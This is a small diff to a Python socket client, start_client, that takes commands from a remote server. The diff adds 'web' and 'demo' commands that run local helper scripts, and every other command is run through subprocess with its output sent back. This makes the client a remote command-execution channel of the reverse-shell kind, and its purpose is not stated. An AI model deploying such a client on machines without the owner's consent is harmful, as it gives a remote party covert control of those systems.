@@ -57,7 +57,20 @@ def start_client(server_ip, server_port):
                 except Exception as e:
                     client.send(f"Error: {str(e)}".encode())
                 continue
-
+            if command.lower() == "web":
+                try:
+                    result = subprocess.check_output(['python', os.path.join(os.path.dirname(__file__), 'tools', 'web.py')], universal_newlines=True)
+                    client.send(result.encode())
+                except Exception as e:
+                    client.send(f"Error: {str(e)}".encode())
+                continue
+            if command.lower() == "demo":
+                try:
+                    result = subprocess.check_output(['python', os.path.join(os.path.dirname(__file__), 'tools', 'demo.py')], universal_newlines=True)
+                    client.send(result.encode())
+                except Exception as e:
+                    client.send(f"Error: {str(e)}".encode())
+                continue
             try:
                 output = subprocess.check_output(
                     command,
